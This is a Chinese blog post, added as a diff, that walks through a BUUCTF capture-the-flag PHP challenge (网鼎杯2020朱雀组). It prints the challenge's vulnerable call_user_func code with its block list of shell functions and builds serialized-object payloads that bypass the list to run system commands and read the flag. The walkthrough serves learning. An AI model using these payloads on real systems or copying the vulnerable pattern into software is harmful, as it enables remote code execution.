@@ -1,0 +1,198 @@
+<!DOCTYPE html><html lang="zh_CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>网鼎杯2020朱雀组 | 牛牛的blog</title><meta name="author" content="牛牛"><meta name="copyright" content="牛牛"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="考察：php代码审计、php反序列化 地址：https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges 打开惊现孙笑川？！还有一段代码说明系统时间设置不安全并报错，且输出的时间和实际时间是有偏差的，看网页源代码还有每隔5秒执行一次的函数（刷新页面），这些信息成功把我带入坑，我以为要修正好系统的时间就可以了。   下面是正规做法： 抓包，请求包数据为： 响应：  可以发现请求包post提交了两个参数（原">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯2020朱雀组">
+<meta property="og:url" content="http://example.com/2022/11/30/%E7%AC%94%E8%AE%B0/BUUCTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84/index.html">
+<meta property="og:site_name" content="牛牛的blog">
+<meta property="og:description" content="考察：php代码审计、php反序列化 地址：https:&#x2F;&#x2F;buuoj.cn&#x2F;challenges 打开惊现孙笑川？！还有一段代码说明系统时间设置不安全并报错，且输出的时间和实际时间是有偏差的，看网页源代码还有每隔5秒执行一次的函数（刷新页面），这些信息成功把我带入坑，我以为要修正好系统的时间就可以了。   下面是正规做法： 抓包，请求包数据为： 响应：  可以发现请求包post提交了两个参数（原">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2022-11-30T13:46:27.543Z">
+<meta property="article:modified_time" content="2022-11-30T15:13:23.173Z">
+<meta property="article:author" content="牛牛">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/11/30/%E7%AC%94%E8%AE%B0/BUUCTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '网鼎杯2020朱雀组',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2022-11-30 23:13:23'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://files.catbox.moe/dbtw19.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">牛牛的blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">网鼎杯2020朱雀组</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-11-30T13:46:27.543Z" title="Created 2022-11-30 21:46:27">2022-11-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-11-30T15:13:23.173Z" title="Updated 2022-11-30 23:13:23">2022-11-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="网鼎杯2020朱雀组"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>考察：php代码审计、php反序列化</p>
+<p>地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
+<p>打开惊现孙笑川？！还有一段代码说明系统时间设置不安全并报错，且输出的时间和实际时间是有偏差的，看网页源代码还有每隔5秒执行一次的函数（刷新页面），这些信息成功把我带入坑，我以为要修正好系统的时间就可以了。</p>
+<p><img src="/2022/11/30/%E7%AC%94%E8%AE%B0/BUUCTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84/image-20221130215332086.png" alt="image-20221130215332086"></p>
+<hr>
+<p>下面是正规做法：</p>
+<p>抓包，请求包数据为：<img src="/2022/11/30/%E7%AC%94%E8%AE%B0/BUUCTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84/image-20221130215525310.png" alt="image-20221130215525310"></p>
+<p>响应：</p>
+<p><img src="/2022/11/30/%E7%AC%94%E8%AE%B0/BUUCTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84/image-20221130215831119.png" alt="image-20221130215831119"></p>
+<p>可以发现请求包post提交了两个参数（原本以为要修正时间，就在参数上加上数据把时间给纠正了，结果证明没有那么简单，思维还需要提高呀），结合回显（可以自己修改func和p参数试试看响应结果）可以发现func的值date是执行的函数，而p的值是函数的参数。</p>
+<p>于是修改参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;system&amp;ls</span><br><span class="line">&#x2F;&#x2F;回显hacker...看来是过滤了一些函数了，换个试试</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;echo&amp;p&#x3D;123</span><br></pre></td></tr></table></figure>
+
+<p>从响应结果的报错信息发现调用了<code>call_user_func()</code>函数<img src="/2022/11/30/%E7%AC%94%E8%AE%B0/BUUCTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84/image-20221130220214476.png" alt="image-20221130220214476"></p>
+<blockquote>
+<p>关于<code>call_user_func()</code>:</p>
+<p><strong>call_user_func ( $callback,$parameter )</strong><br><code>callback</code>：将被调用的回调函数。<code>parameter</code>：将要传入callback回调函数的参数。</p>
+<p>也就是说相当于执行了函数date(Y-m-d+h:i:s+a)</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u012460314/article/details/83348955">https://blog.csdn.net/u012460314/article/details/83348955</a></p>
+</blockquote>
+<p>利用这个<code>call_user_func()</code>函数，来查看原代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;highlight_file&amp;p&#x3D;index.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/30/%E7%AC%94%E8%AE%B0/BUUCTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84/image-20221130221611497.png" alt="image-20221130221611497"></p>
+<p>内容是回显出来了，但是看着非常杂乱，换个内置函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;file_get_contents&amp;p&#x3D;index.php</span><br></pre></td></tr></table></figure>
+
+<p>成功回显<img src="/2022/11/30/%E7%AC%94%E8%AE%B0/BUUCTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84/image-20221130221823318.png" alt="image-20221130221823318"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> $disable_fun = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">     $result = call_user_func($func, $p);</span><br><span class="line">     $a= gettype($result);</span><br><span class="line">     <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> $result;</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">     <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">     <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">             <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"> $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"> <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">     $func = strtolower($func);</span><br><span class="line">     <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">         <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">     &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码审计：func函数不能在$disable_fun里，调用gettime函数，调用call_user_func()，执行func函数，参数为p， 返回结果；代码中有魔法函数_destruct()，销毁类对象时自动调用，同样会调用gettime函数</p>
+<p>反序列化：这个题目只要能够使得gettime函数能够执行即可，这两个执行一个是在if条件里，一个是类对象消失时自动调用魔术方法，这样我们就可以构造两次函数，构造序列化payload，在if里，使函数为unserialize。</p>
+<p>所以构造序列化对象</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> $p = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">  <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Test();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>结果：O:4:”Test”:2:{s:1:”p”;s:2:”ls”;s:4:”func”;s:6:”system”;}</p>
+<p>修改参数：<img src="/2022/11/30/%E7%AC%94%E8%AE%B0/BUUCTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84/image-20221130222628669.png" alt="image-20221130222628669"></p>
+<p>响应结果：<img src="/2022/11/30/%E7%AC%94%E8%AE%B0/BUUCTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84/image-20221130222650478.png" alt="image-20221130222650478"></p>
+<p>相当于gettime执行了两次，call_user_func()也执行了两次，第一次是if内的跳转，将p给反序列化了，第二次是Test对象销毁后调用魔术方法执行的。</p>
+<p>找flag：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(find / -name flag*);</span><br></pre></td></tr></table></figure>
+
+<p>序列化后为：</p>
+<p>func=unserialize&amp;p=O:4:”Test”:2:{s:1:”p”;s:18:”find / -name flag*”;s:4:”func”;s:6:”system”;}</p>
+<p>得到</p>
+<img src="/2022/11/30/%E7%AC%94%E8%AE%B0/BUUCTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84/image-20221130231128378.png" alt="image-20221130231128378" style="zoom:67%;">
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(/tmp/flagoefiu4r93);</span><br></pre></td></tr></table></figure>
+
+<p>改p=O:4:”Test”:2:{s:1:”p”;s:18:”/tmp/flagoefiu4r93”;s:4:”func”;s:14:”highlight_file”;} </p>
+<p>得到</p>
+<p><img src="/2022/11/30/%E7%AC%94%E8%AE%B0/BUUCTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84/image-20221130231321389.png" alt="image-20221130231321389"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">牛牛</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/11/30/%E7%AC%94%E8%AE%B0/BUUCTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84/">http://example.com/2022/11/30/%E7%AC%94%E8%AE%B0/BUUCTF/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/12/08/%E7%AC%94%E8%AE%B0/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2022/11/29/%E7%AC%94%E8%AE%B0/THM/red-content_discovery/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">content discovery</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://files.catbox.moe/dbtw19.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">牛牛</div><div class="author-info__description">👁</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/03/21/%E7%AC%94%E8%AE%B0/DC9/" title="No title"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="No title"/></a><div class="content"><a class="title" href="/2023/03/21/%E7%AC%94%E8%AE%B0/DC9/" title="No title">No title</a><time datetime="2023-03-21T15:20:01.735Z" title="Created 2023-03-21 23:20:01">2023-03-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/" title="No title"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="No title"/></a><div class="content"><a class="title" href="/2023/03/17/%E9%9D%B6%E5%9C%BA/%E9%9B%B6%E6%95%A3%E7%9A%84%E9%9D%B6%E6%9C%BA/" title="No title">No title</a><time datetime="2023-03-16T18:00:08.791Z" title="Created 2023-03-17 02:00:08">2023-03-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/14/%E9%9D%B6%E5%9C%BA/corrosion2/" title="VulnHub——rorrosion2"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VulnHub——rorrosion2"/></a><div class="content"><a class="title" href="/2023/03/14/%E9%9D%B6%E5%9C%BA/corrosion2/" title="VulnHub——rorrosion2">VulnHub——rorrosion2</a><time datetime="2023-03-14T13:36:31.080Z" title="Created 2023-03-14 21:36:31">2023-03-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/13/%E9%9D%B6%E5%9C%BA/toppo/" title="Vunlhub-Toppo1"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Vunlhub-Toppo1"/></a><div class="content"><a class="title" href="/2023/03/13/%E9%9D%B6%E5%9C%BA/toppo/" title="Vunlhub-Toppo1">Vunlhub-Toppo1</a><time datetime="2023-03-13T11:53:03.026Z" title="Created 2023-03-13 19:53:03">2023-03-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/" title="Lazysysadmin"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lazysysadmin"/></a><div class="content"><a class="title" href="/2023/03/10/%E9%9D%B6%E5%9C%BA/lazysysadmin/" title="Lazysysadmin">Lazysysadmin</a><time datetime="2023-03-10T06:58:06.887Z" title="Created 2023-03-10 14:58:06">2023-03-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 牛牛</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
